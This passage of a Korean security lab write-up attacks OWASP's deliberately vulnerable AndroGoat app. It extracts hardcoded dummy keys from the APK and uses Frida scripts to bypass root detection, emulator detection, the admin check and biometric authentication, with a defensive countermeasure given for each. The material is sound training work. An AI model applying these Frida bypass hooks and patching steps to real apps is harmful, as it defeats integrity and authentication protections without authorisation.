| API 31+: 다른 앱이 붙여넣을 때 토스트 알림 | 사용자에게 알림 | 사후 알림일 뿐 차단은 아님 |
| API 33+: 복사할 때 미리보기, `EXTRA_IS_SENSITIVE`로 가림 가능 | 민감 값 가림 기능 제공 | 플래그를 쓰지 않아 OTP가 화면에 그대로 보임 |
| 키보드는 `textPassword`, `textNoSuggestions` 칸을 학습하지 않음 | 비밀번호 학습 방지 | inputType을 지정하지 않아 **일반 텍스트로 학습됨** |

###  한계
- 5-2의 "다른 앱"은 Chrome 프로세스 안에서 Frida로 API를 호출해 **흉내 낸 것**이다. 같은 API를 쓰는 실제 악성 앱도 결과는 같다.
- 5-3의 학습 DB(`trainingcachev3.db`)는 Gboard의 내부 형식이라 구조를 완전히 해석하지는 못했다. 단어 문자열이 들어 있다는 것과, 그 결과 추천 바에 나타난다는 것까지 확인했다. 키보드 앱 데이터는 root가 있어야 읽을 수 있다.
- 키보드 학습은 키보드 앱(Gboard, 삼성 키보드 등)과 설정(시크릿 모드, 개인화 학습 끄기)에 따라 다르다.

### 대응 방법
- 민감 정보를 로그에 남기지 않는다. 릴리스 빌드에서는 R8/ProGuard로 `Log.*` 호출을 제거한다.
- OTP는 클립보드에 넣지 않는다. 꼭 넣어야 하면 `EXTRA_IS_SENSITIVE`를 설정하고 짧은 시간 뒤에 지운다.
- 비밀번호, 카드 번호, OTP 칸에는 `textPassword`, `numberPassword`, `textNoSuggestions` 등 알맞은 `inputType`을 지정한다. 필요하면 `IME_FLAG_NO_PERSONALIZED_LEARNING`도 설정한다.

## 6. Hardcode Issues

> **쉽게 말하면,** 보물 열쇠(API 키)를 장난감 설명서 안에 적어둔 셈이다. 장난감을 뜯으면(APK를 열면) 누구나 그 열쇠를 그냥 읽는다.

<img src="/assets/androgoat/attachments/06_hardcode/02_menu.png" alt="Hardcode 메뉴" width="420">

"시크릿(secret)"은 비밀번호, API 키, 프로모 코드처럼 **코드 안에 숨겨 두면 안 되는 값**이다. 앱을 설치하면 공격자도 APK를 가지므로, 앱 안에 박아 둔 값은 숨긴 것이 아니다.

### 핵심: APK만 있으면 소스 없이도 꺼낼 수 있다
공격자는 보통 **설치 파일(APK)** 만 가진다. 그래서 소스 코드를 보지 않고, 기기에서 APK를 꺼내 그 안의 문자열만 뒤졌다. ([원본](/posts/2026-11-12-ag-06_hardcode-01_apk_dex_strings.html))
```
# 1) 기기에 설치된 APK 추출
$ adb shell pm path owasp.sat.agoat
package:/data/app/.../base.apk
$ adb pull <base.apk>   → 6,964,065 bytes

# 2) APK(zip) 해제 → DEX 파일에서 문자열 패턴 검색 (디컴파일조차 불필요)
[AWS Access Key ID]      AKIAX56QK…Q7G7ABC
[AWS Secret Access Key]  OviCwsFN…+lOABCw
[OpenAI API Key]         sk-abcdef…abcdef12
[Promo Code]             NEW2019
```
- `AKIA...`, `sk-...` 같은 키는 **고정된 형식**이 있어서, 자동 시크릿 스캐너(gitleaks, trufflehog 등)가 그대로 찾아낸다. 이번엔 정규식 `grep` 수준으로도 전부 나왔다.

### 6-1. 하드코딩된 프로모 코드
**취약 코드** (`HardCodeActivity.kt`): `private val promoCode = "NEW2019"`
**발화**: 위에서 찾은 `NEW2019`를 입력 → 상품 가격이 **2000 → 0**
<img src="/assets/androgoat/attachments/06_hardcode/03_shopping_before.png" alt="프로모 입력 전" width="420"> <img src="/assets/androgoat/attachments/06_hardcode/04_promocode_free.png" alt="무료 획득" width="420">

### 6-2. 하드코딩된 AWS 키
**취약 코드** (`CloudServicesActivity.kt`)
```kotlin
private val aws_access_key_id = "AKIAX56QK…Q7G7ABC"
private val aws_secret_access_key = "OviCwsFN…+lOABCw"
```
**발화**: VIEW MY CLOUD SERVICES → 대화상자에 AWS 키가 그대로 표시된다.
<img src="/assets/androgoat/attachments/06_hardcode/05_aws_keys_dialog.png" alt="AWS 키 대화상자" width="420">

게다가 이 키는 logcat에도 남는다(§5-1과 중복 취약점). ([원본](/posts/2026-11-12-ag-06_hardcode-07_secrets_logcat.html))
```
D [Info] : Connected to AWS account using Access key AKIAX56QK…Q7G7ABC and secret key OviCwsFN…+lOABCw
```

### 6-3. 하드코딩된 OpenAI API 키
**취약 코드** (`AIChatActivity.kt`): `private val openAIApiKey = "sk-abcdef...12"`
**발화**: AI CHAT → SUBMIT → 대화상자에 OpenAI 키가 표시된다.
<img src="/assets/androgoat/attachments/06_hardcode/06_openai_key_dialog.png" alt="OpenAI 키 대화상자" width="420">

### 정책 vs 코드
- 이 취약점은 **OS 정책으로 막는 종류가 아니다.** targetSdk를 아무리 올려도, 코드에 박은 문자열은 APK 안에 그대로 들어간다.
- Kotlin의 `private val`도 접근 제어자일 뿐, 컴파일된 DEX의 문자열 상수 풀에는 평문으로 남는다. R8/ProGuard 난독화도 **문자열 값 자체는 바꾸지 않는다**(이름만 바꾼다).
- 즉 "앱에 넣었으니 안전하다"는 가정이 처음부터 틀렸다. 이 키들은 이미 유출된 것으로 봐야 한다.

###  한계 / 참고
- 이 키들은 AndroGoat가 만든 **가짜 값**이라 실제 AWS/OpenAI에 접속되지는 않는다. `ABC`로 끝나는 등 형식만 맞춘 더미다. 핵심은 "실제 키였다면 그대로 탈취됐다"는 점이다.
- 실제 유출 사고에서는 이렇게 얻은 AWS 키로 S3 버킷, 과금 리소스에 접근하는 피해가 발생한다.

### 대응 방법
- 비밀 키를 앱에 넣지 않는다. 클라이언트는 **단기 토큰**만 받고, 실제 키는 서버(백엔드)가 보관한다.
- 클라우드는 임시 자격 증명(STS, Cognito 등)을 쓴다.
- CI에 시크릿 스캐너를 넣어 커밋 단계에서 하드코딩을 잡는다.
- 이미 커밋/배포된 키는 **폐기하고 재발급**한다(난독화로는 못 숨긴다).

## 7. Root Detection   (`RootDetectionActivity`, Frida 우회)

> **쉽게 말하면,** 앱이 '내 폰 개조(루팅)됐나?'를 스스로 검사하는데, 그 검사 방법 자체를 요술봉으로 속여 '안 됐다'고 대답하게 만든다.

<img src="/assets/androgoat/attachments/07_root_detection/01_screen.png" alt="Root Detection 화면" width="420">

**취약 코드**: su 관련 파일이 존재하는지를 `File(path).exists()`로 확인한다.
```kotlin
val file = arrayOf("/system/bin/su", "/system/xbin/su", "/data/local/su",
                   "/data/local/xbin/su", "/su/bin/su", ...)
for (files in file) { if (File(files).exists()) { result = true; break } }
```

###  중요한 관찰: 기본 상태에서는 탐지 자체가 실패한다
- 이 에뮬레이터에는 실제로 `/system/xbin/su`가 있고 `adb root`도 된다. **그런데 CHECK ROOT를 누르면 "Device is not rooted"가 나온다.**
- 이유: `/system/xbin/su`는 소유자/그룹이 `root/shell`이고 권한이 `-rwsr-x---`다. 앱(`untrusted_app`, uid a174)은 이 파일에 접근 권한이 없어서 `File.exists()`가 `false`를 반환한다. SELinux와 파일 권한이 **naive한 파일 탐지를 무력화**한 것이다.
- 즉 이 탐지 코드는 **옛날 루팅 방식(su가 world-readable하던 시절)** 을 가정한 것이라, 최신 환경의 루트를 못 잡는다. 이것부터가 정직한 한계다.

### 7-1. 탐지가 동작하게 만들기
Frida 우회를 의미 있게 보여 주려면, 먼저 탐지가 **참으로 동작하는 상태**를 만들어야 한다. 앱이 검사하는 경로 중 하나(`/data/local/su`)에 su 바이너리를 **앱이 읽을 수 있는 권한(755)** 으로 복사했다. (실제 Magisk 루팅 기기에서는 이런 파일이 존재해 탐지가 동작한다.)
```
$ adb shell "cp /system/xbin/su /data/local/su; chmod 755 /data/local/su"
```
→ 이제 CHECK ROOT가 **"Device is rooted"** 를 표시한다.
<img src="/assets/androgoat/attachments/07_root_detection/02_detected_rooted.png" alt="탐지됨" width="420">

### 7-2. Frida로 탐지 우회
[`frida/bypass-root-detection.js`](/posts/2026-11-12-ag-frida-bypass-root-detection.html) — su 경로에 대해서만 `File.exists()`가 false를 반환하게 하고, 앱의 `isRooted()`도 직접 false로 덮었다.
```javascript
File.exists.implementation = function () {
    var path = this.getAbsolutePath();
    if (path.indexOf("su") !== -1 || path.indexOf("Superuser") !== -1 || ...) {
        return false;                       // su 파일만 "없다"고 응답
    }
    return this.exists();                   // 나머지 파일은 정상 동작
};
Act.isRooted.implementation = function () { return false; };
```
콘솔 ([원본](/posts/2026-11-12-ag-07_root_detection-03_frida_bypass_console.html))
```
[*] root detection bypass loaded
[root-bypass] RootDetectionActivity.isRooted() → false
```
→ 루팅 상태인데도 **"Device is not rooted"** 로 바뀌었다.
<img src="/assets/androgoat/attachments/07_root_detection/04_bypassed_not_rooted.png" alt="우회됨" width="420">

### 정책 vs 코드
- 루트 탐지는 OS가 제공하는 기능이 아니라 **앱이 스스로 하는 방어**다. 그래서 공격자가 기기와 앱 프로세스를 장악(루팅+Frida)하면, 그 방어 로직 자체를 바꿀 수 있다.
- 아이러니하게도 최신 Android의 SELinux는 이 앱의 **탐지를 돕는 게 아니라 방해**했다(7장 앞부분). 그만큼 파일 기반 탐지는 신뢰할 수 없다.

###  한계
- 기본 에뮬레이터에서는 탐지가 동작하지 않아, 우회를 보여 주기 위해 su 파일을 일부러 접근 가능하게 심었다. 실제 루팅 기기(Magisk 등)에서는 이 단계가 필요 없다.
- `isRooted1()`(`Runtime.exec("su")` 방식)은 앱 코드에서 주석 처리되어 호출되지 않는다. 그래서 이번 탐지는 파일 존재 확인 한 가지만 동작했다.

### 대응 방법
- 단일 방식에 의존하지 않는다(파일, 패키지, `getprop`, SELinux 상태, SafetyNet/Play Integrity 등 다중 신호).
- 중요한 판단은 서버 측 Play Integrity API 검증과 결합한다.
- 다만 **루팅+Frida 환경에서는 어떤 클라이언트 측 탐지도 결국 우회 가능**하다는 점을 전제로 설계한다(심층 방어).

## 8. Emulator Detection  (`EmulatorDetectionActivity`, Frida 우회)

> **쉽게 말하면,** 앱이 '지금 진짜 폰이야, 가짜야?'를 이름표(Build 정보)로 판단한다. 그 이름표를 진짜 폰(Pixel 7)으로 바꿔 붙여 속인다.

<img src="/assets/androgoat/attachments/08_emulator_detection/01_screen.png" alt="Emulator Detection 화면" width="420">

**취약 코드**: `android.os.Build`의 여러 필드를 이어 붙여 특정 문자열이 있는지 본다.
```kotlin
val buildDetails = (Build.FINGERPRINT + Build.DEVICE + Build.MODEL + Build.BRAND +
                    Build.PRODUCT + Build.MANUFACTURER + Build.HARDWARE).toLowerCase()
return buildDetails.contains("generic") || contains("sdk") || contains("x86") ||
       contains("goldfish") || contains("emulator") || contains("vbox") || ...
```

### 8-1. 정상 탐지
이 에뮬레이터의 Build 값은 다음과 같다. ([원본](/posts/2026-11-12-ag-08_emulator_detection-02_build_props.html))
```
ro.product.model       = sdk_gphone64_x86_64       ← "sdk", "x86" 포함
ro.hardware            = ranchu
ro.build.fingerprint   = google/sdk_gphone64_x86_64/emu64x:13/.../dev-keys
```
→ `sdk`, `x86`가 걸려 **"This device is an Emulator"** 를 표시한다.
<img src="/assets/androgoat/attachments/08_emulator_detection/03_detected_emulator.png" alt="탐지됨" width="420">

### 8-2. Frida로 우회
[`frida/bypass-emulator-detection.js`](/posts/2026-11-12-ag-frida-bypass-emulator-detection.html) — `Build`의 정적 필드를 실제 단말(Pixel 7) 값으로 덮어쓴다.
```javascript
var Build = Java.use("android.os.Build");
Build.MODEL.value = "Pixel 7";
Build.FINGERPRINT.value = "google/panther/panther:13/TQ3A.230805.001/.../release-keys";
Build.HARDWARE.value = "panther";  // ... DEVICE, BRAND, PRODUCT, MANUFACTURER 등
Act.isEmulator.implementation = function () { return false; };
```
콘솔 ([원본](/posts/2026-11-12-ag-08_emulator_detection-04_frida_bypass_console.html))
```
[*] Build 필드를 Pixel 7 값으로 변경
    MODEL=Pixel 7  FINGERPRINT=google/panther/panther:13/...
[emu-bypass] isEmulator() → false
```
→ 에뮬레이터인데도 **"This device is not an Emulator"** 로 바뀌었다.
<img src="/assets/androgoat/attachments/08_emulator_detection/05_bypassed_not_emulator.png" alt="우회됨" width="420">

### 정책 vs 코드 /  한계
- `Build` 필드는 상수처럼 보이지만 실제로는 일반 정적 변수라, 앱 프로세스 안에서 Frida로 값을 바꿀 수 있다.
- 이 탐지는 문자열 매칭이라 **오탐도 많다.** 예를 들어 실제 단말이라도 제품명에 우연히 걸리는 문자열이 있으면 에뮬레이터로 오인할 수 있다. 반대로 공격자는 Build 값만 바꾸면 쉽게 회피한다.
- 더 정교한 탐지(센서 개수, `/proc` 내용, QEMU 흔적 등)도 있지만, 모두 앱 프로세스 안에서 동작하므로 Frida로 우회 가능하다.

### 대응 방법
- 단일 신호(Build 문자열)에 의존하지 않는다. 다중 신호를 쓰되, 최종 판단은 서버 측 Play Integrity로 보강한다.
- 루트 탐지와 마찬가지로, 클라이언트 측 탐지는 **지연·비용 증가** 수단일 뿐 완벽한 차단은 불가능하다고 전제한다.

## 9. Binary Patching   (`BinaryPatchingActivity`)

> **쉽게 말하면,** 앱 안에 '너는 관리자 아님'이라고 박아둔 쪽지가 있다. 이 쪽지를 '관리자 맞음'으로 바꿔치기해서 잠긴 기능을 연다.

**취약 코드**: 관리자 여부가 **코드에 박힌 상수**다.
```kotlin
private val isAdmin: Boolean = false
...
if (isAdmin) { isAdminText.text = "You are Admin Now"; adminButton.isEnabled = true }
```
서버 확인 없이 클라이언트의 값 하나로 권한을 정한다. 공격자는 이 값만 뒤집으면 된다.

### 9-1. 정상 상태
"Sorry, You don't have access to this feature." — 관리자 아님
<img src="/assets/androgoat/attachments/09_binary_patching/01_screen_not_admin.png" alt="관리자 아님" width="420">

### 9-2. 목표 달성 (Frida 동적 방식)
원래 "Binary Patching"은 APK를 뜯어 바이트코드를 고치는 **정적 패칭**을 뜻한다. 이번에는 같은 목표(관리자 UI 활성화)를 Frida로 달성했다. 이미 떠 있는 화면 인스턴스를 찾아 관리자 UI를 켰다. ([`frida/bypass-binary-patching.js`](/posts/2026-11-12-ag-frida-bypass-binary-patching.html))
```javascript
Java.choose("owasp.sat.agoat.BinaryPatchingActivity", {
    onMatch: function (act) {
        // isAdmin=false 분기를 무시하고 관리자 UI를 직접 활성화
        tv.setText("You are Admin Now"); btn.setEnabled(true);
    }
});
```
→ **"You are Admin Now"**, ADMINISTRATION 버튼 활성화
<img src="/assets/androgoat/attachments/09_binary_patching/03_admin_enabled.png" alt="관리자 획득" width="420">

### 9-3. 정적 패칭 지점 확인
실제 바이너리 패칭이 어디를 고치는지 DEX에서 확인했다. ([원본](/posts/2026-11-12-ag-09_binary_patching-04_static_patch_note.html))
```
classes4.dex에서 BinaryPatchingActivity와 "You are Admin Now" 문자열 확인 (offset 71622)
정적 패칭 절차: apktool d → smali에서 isAdmin 초기화 const/4 vX, 0x0 → 0x1 변경
             → apktool b → 재서명(apksigner) → 재설치
```
- ⚠️ **한계/정직한 기록**: 이번 실습에서 실제 smali 패칭 → 재빌드 → 재서명까지는 하지 않았다. 대신 동일한 결과를 Frida로 보였다. 두 방법의 차이는 아래 "정책 vs 코드"에 정리한다.

### 정책 vs 코드
| 방식 | 지속성 | 서명 | targetSdk 33과의 관계 |
|---|---|---|---|
| Frida (동적) | 실행 중에만 | 원본 서명 유지 | OS는 못 막음(루팅+Frida 전제). 재부팅하면 원복 |
| 정적 패칭 (smali) | 영구 | **재서명 필요** → 서명이 바뀜 | 설치는 됨. 단 서버가 서명/무결성(APK signature, Play Integrity)을 검증하면 탐지 가능 |

- 핵심 교훈은 같다: **권한 판단을 클라이언트에 두면 안 된다.** 상수든 분기든, 기기를 가진 사람이 바꿀 수 있다.

### 대응 방법
- 관리자 여부 같은 권한은 **서버가 판단**하고, 민감 기능은 서버 API로 보호한다(클라이언트 UI를 열어도 데이터는 못 가져가게).
- 앱 무결성 검증(서명 확인, Play Integrity)으로 재패키징된 앱을 걸러낸다. 단 이것도 심층 방어의 한 겹일 뿐이다.

## 10. Biometric Authentication  (`BioMetricAuthActivity`, Frida 우회)

> **쉽게 말하면,** 지문을 한 번도 안 찍었는데 '성공!' 버튼만 대신 눌러서 통과한다. 지문 검사 결과를 진짜 열쇠(암호 키)에 묶어두지 않은 허점을 노린다.

<img src="/assets/androgoat/attachments/10_biometric/01_screen.png" alt="Biometric 화면" width="420">

**취약 코드**: 인증 성공 콜백이 **암호화와 연결돼 있지 않다**.
```kotlin
biometricPrompt = BiometricPrompt(this, executor, object : AuthenticationCallback() {
    override fun onAuthenticationSucceeded(result: AuthenticationResult) {
        Toast.makeText(..., "Authentication succeeded! ", ...).show()   // 그냥 성공 표시
    }
})
// authenticate 시 CryptoObject 를 쓰지 않음
biometricPrompt.authenticate(promptInfo)   // ← promptInfo 만, CryptoObject 없음
```
안전한 방식은 `authenticate(promptInfo, CryptoObject)`로 **키 사용을 생체 인증에 묶는 것**이다. 그러면 성공 여부가 OS가 보증하는 암호 연산 결과로 나타나, 단순히 콜백만 불러서는 아무것도 복호화할 수 없다. 이 앱은 그렇게 하지 않아, **성공 콜백을 직접 호출하기만 하면 통과**된다.

### 10-1. 정상 상태
이 에뮬레이터에는 **지문이 하나도 등록돼 있지 않다**. 버튼을 누르면 "The user hasn't associated any biometric credentials." 토스트가 뜬다.
<img src="/assets/androgoat/attachments/10_biometric/02_click_result.png" alt="지문 미등록" width="420">

### 10-2. Frida로 우회
지문이 없어도, 앱의 인증 성공 콜백을 직접 호출했다. ([`frida/bypass-biometric.js`](/posts/2026-11-12-ag-frida-bypass-biometric.html))
```javascript
Java.choose("owasp.sat.agoat.BioMetricAuthActivity$onCreate$1", {
    onMatch: function (cb) {
        var result = AuthResult.$new(null, 2);      // CryptoObject=null
        cb.onAuthenticationSucceeded(result);       // 성공 콜백 직접 호출
    }
});
```
콘솔 ([원본](/posts/2026-11-12-ag-10_biometric-03_frida_bypass_console.html))
```
[*] callback 탐색 완료
[bio-bypass] 지문 미등록 상태에서 onAuthenticationSucceeded 직접 호출 → 성공
```
→ 지문이 전혀 없는데도 **"Authentication succeeded!"**
<img src="/assets/androgoat/attachments/10_biometric/04_bypassed_success.png" alt="우회 성공" width="420">

### 정책 vs 코드
- Android의 `BiometricPrompt` 자체는 안전하게 설계돼 있다. 문제는 앱이 **인증 결과를 아무 데도 활용하지 않는다**는 점이다(성공 UI만 표시).
- `CryptoObject`를 쓰면, 인증이 성공해야만 Keystore 키가 열리고 그 키로 데이터를 복호화/서명할 수 있다. 콜백을 억지로 불러도 키가 없으면 다음 단계가 진행되지 않으므로, 이런 우회가 **의미 없어진다**.
- 즉 이 취약점은 "생체 인증을 UI 통과용 스위치로만 쓴" 설계 실수다.

### 대응 방법
- `BiometricPrompt.authenticate(promptInfo, CryptoObject)` 형태로 **Keystore 키와 묶는다**. 인증 성공 시 받은 `CryptoObject`로만 민감 데이터를 처리한다.
- `BIOMETRIC_WEAK` 대신 `BIOMETRIC_STRONG`을 요구한다(이 앱은 WEAK를 썼다).
- 인증 성공만으로 권한을 부여하지 말고, 서버 측 검증과 결합한다.

## 11. 앱 전역 설정

> **쉽게 말하면,** 특정 화면이 아니라 앱 전체의 안전 스위치(디버그·백업 허용) 얘기다. 이게 켜져 있으면 앞의 공격들이 한결 쉬워진다.

매니페스트와 빌드에서 비롯된 전역 취약점이다. 특정 화면이 아니라 앱 전체에 영향을 준다. ([원본](/posts/2026-11-12-ag-11_app_config-01_flags_console.html))
```
$ adb shell dumpsys package owasp.sat.agoat | findstr flags
flags=[ DEBUGGABLE HAS_CODE ALLOW_CLEAR_USER_DATA TEST_ONLY ALLOW_BACKUP ]
```

### 11-1. `debuggable=true`
- 이 플래그 덕분에 §3, §4 전체에서 `run-as`로 앱 샌드박스에 들어갈 수 있었다.
```
$ adb shell run-as owasp.sat.agoat id
uid=10174(u0_a174) ... context=u:r:runas_app:s0:...     ← 앱 자신의 신분으로 전환됨
```
- 또한 디버거(jdwp)를 붙일 수 있고, 이것만으로도 메모리/변수 조작이 가능하다.
- ⚠️ 참고: 이 플래그는 **debug 빌드라서** 붙었다. 실제 릴리스 빌드(`debuggable=false`)에서는 `run-as`가 막히고, 같은 데이터를 꺼내려면 root가 필요하다. 이번 실습이 "debug 빌드 기준"이라는 점은 정직하게 기록한다. `TEST_ONLY`도 같은 이유로 붙었다.

### 11-2. `allowBackup=true`  (부분)
- `allowBackup=true`면 백업 경로로 앱 데이터가 빠져나갈 수 있다는 것이 전통적 취약점이다.
- ⚠️ **한계**: `adb backup`은 실행 시 **기기 화면에서 사용자가 직접 "데이터 백업" 버튼을 눌러야** 진행된다(자동화 불가). 또한 Android 12(API 31)부터 `adb backup`은 기본적으로 앱 APK/데이터를 거의 포함하지 않도록 크게 제한됐다. 그래서 이번 환경(API 33)에서는 `adb backup`만으로 데이터를 빼내는 실증은 **의미가 제한적**이라, 플래그 존재 확인까지만 했다.
- 같은 데이터는 이미 §3에서 `run-as`로 모두 추출했으므로, 실질적 유출은 증명된 셈이다.

### 대응 방법
- 릴리스 빌드는 `debuggable=false`(기본값)로 배포한다. `TEST_ONLY`가 붙지 않게 한다.
- `allowBackup=false`로 두거나, 백업에서 민감 파일을 제외하는 규칙(`fullBackupContent`, `dataExtractionRules`)을 지정한다.

---


## 12. 결론: targetSdk 33 정책이 막은 것과 못 막은 것

> **쉽게 말하면,** 지금까지 한 걸 한눈에 정리한다. 요즘 폰이 막아준 것, 앱이 스스로 챙겨야 하는 것, 그래도 끝내 못 막는 것(루팅+요술봉)을 나눠서 본다.

### 정책이 "막아 준" 것 (OS의 기본 방어가 동작)
| 영역 | 최신 정책의 효과 |
|---|---|
| 평문 HTTP | API 28+ 기본 차단 (앱이 `cleartextTrafficPermitted`로 되뚫음) |
| 사용자 인증서 신뢰 | API 24+ 기본 불신 (앱이 `<certificates src="user">`로 되뚫음) |
| 다른 앱의 내부 저장소/외부 앱 폴더 | 샌드박스 + Scoped Storage로 차단 (대조 실험에서 `Permission denied`) |
| 다른 앱의 로그 | `READ_LOGS` 시스템 권한으로 차단 |
| 백그라운드 서비스/토스트/클립보드 | API 26/29/31/33에서 각각 제한 |
| `file://` WebView, 교차 출처 | API 30+ 기본 차단 (앱이 `allowFileAccess` 등으로 되뚫음) |
| `exported` 미명시 컴포넌트 | API 31+ 설치 거부 (앱이 `exported="true"` 명시로 되뚫음) |

→ **공통 패턴**: 최신 Android는 기본값을 안전하게 바꿨지만, **개발자가 한 줄로 그 보호를 꺼 버리면** 그대로 뚫린다. AndroGoat의 취약점 대부분이 "정책이 막는데 코드가 다시 연" 경우였다.

### 정책이 "못 막는" 것 (앱이 스스로 해야 함)
| 영역 | 이유 |
|---|---|
| 평문 저장(SharedPrefs, SQLite, 파일) | OS는 앱 내부 데이터를 자동 암호화하지 않음 → 앱이 Keystore로 직접 |
| 하드코딩 시크릿 | 코드에 박힌 문자열은 APK에 그대로 → 설계로 해결 |
| 로그/클립보드/키보드 유출 | 앱이 무엇을 흘리는지는 앱 책임 |
| 입력 검증(XSS, SQLi) | 앱 로직의 문제 |
| 루트/에뮬레이터/생체/피닝 | 모두 **클라이언트 측 방어**라 루팅+Frida 앞에서는 무력. 서버 검증과 결합해야 함 |

### 가장 중요한 교훈
1. **클라이언트 측 방어(루트·에뮬레이터·피닝·생체·바이너리)는 완벽히 막을 수 없다.** 루팅+Frida 환경에서는 모두 우회됐다. 이들은 "공격 비용을 올리는" 심층 방어의 한 겹일 뿐, 최종 판단은 서버가 해야 한다.
2. **최신 OS 정책은 강력하지만, 개발자가 끄면 끝이다.** 안전한 기본값을 유지하는 것이 가장 효과적인 방어다.
3. **민감한 판단과 데이터는 서버로.** 점수(§3-2), 관리자 권한(§9), 생체 성공(§10) 모두 클라이언트에 맡겨 뚫렸다.

### 정직한 한계 (이 실습의 범위)
- **debug 빌드** 기준이라 `run-as`로 쉽게 접근했다. 릴리스 빌드였다면 다수 항목에서 root가 필요했다.
- OkHttp3 피닝은 핀이 오래돼 **정상 환경에서도 실패**했다(§1-3). HTTP 대상 서버는 응답하지 않았다(§1-1).
- OS 명령 인젝션은 성립하지 않았고(인자 주입만, §4-5), 루트 탐지는 기본 상태에서 동작조차 안 했다(§7).
- QR XSS는 카메라 대신 Frida로 디코딩 결과를 주입했고(§4-4), 클립보드·바이너리 패칭·생체 우회는 실제 공격 상황을 Frida로 재현한 것이다.
- `adb backup`과 정적 바이너리 패칭의 재빌드·재서명은 실행하지 않고 경로만 확인했다(§9, §11).

---

## 부록 A. 용어 사전
| 용어 | 뜻 |
|---|---|
| APK | 안드로이드 앱 설치 파일 |
| DEX | APK 안에 든, 안드로이드가 실행하는 바이트코드 파일 |
| 샌드박스 | 앱마다 격리된 저장/실행 공간 |
| adb | PC에서 안드로이드를 조작하는 명령 도구 |
| run-as | debuggable 앱의 권한으로 그 앱 폴더에 접근하는 adb 명령 |
| root | 기기의 최고 관리자 권한 |
| logcat | 앱들이 남기는 로그를 보는 도구 |
| Frida | 실행 중인 앱의 함수를 가로채 바꾸는 동적 분석 도구 |
| 프록시(Burp) | 앱↔서버 통신을 중간에서 보는 도구 |
| 인증서 피닝 | 앱이 특정 서버 인증서만 신뢰하도록 고정하는 방어 |
| CryptoObject | 생체 인증 성공과 암호 키 사용을 묶는 객체 |
| exported | 컴포넌트를 다른 앱이 호출할 수 있게 여는 설정 |

## 부록 B. 사용한 Frida 스크립트
`frida/` 폴더에 모두 저장되어 있다.
| 파일 | 용도 |
|---|---|
| `log-okhttp-failure.js` | §1 OkHttp 콜백 후킹(숨은 예외 출력) |
| `bypass-okhttp3-pinning.js` | §1 OkHttp3 피닝 우회 |
| `bypass-nsc-pinning.js` | §1 NSC 피닝 우회 |
| `log-toast.js` | §2 리시버 토스트 가로채기 |
| `inject-qr-result.js` | §4 QR 스캔 결과 주입 |
| `read-clipboard.js` | §5 다른 앱에서 클립보드 읽기 |
| `bypass-root-detection.js` | §7 루트 탐지 우회 |
| `bypass-emulator-detection.js` | §8 에뮬레이터 탐지 우회 |
| `bypass-binary-patching.js` | §9 관리자 UI 활성화 |
| `bypass-biometric.js` | §10 생체 인증 우회 |

